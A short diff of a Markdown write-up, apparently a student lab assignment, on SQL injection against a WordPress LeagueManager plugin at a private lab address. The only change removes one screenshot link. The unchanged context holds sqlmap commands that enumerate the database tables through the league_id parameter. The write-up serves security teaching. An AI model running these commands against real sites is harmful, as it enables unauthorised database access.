@@ -159,7 +159,6 @@ python sqlmap.py --url "http://192.168.100.19/wordpress/2017/11/04/hello-world/?
 ![leaguemanager 3](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/leaguemanager_tables3.png)
 ![leaguemanager 4](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/leaguemanager_tables4.png)
 ![leaguemanager 5](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/leaguemanager_tables5.png)
-![leaguemanager 6](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/leaguemanager_tables6.png)
 
 - atau:<pre>
 python sqlmap.py --url "http://192.168.100.19/wordpress/2017/11/04/hello-world/?league_id=1&season=Winter" --level 5 --risk 3 --dbms mysql --tables
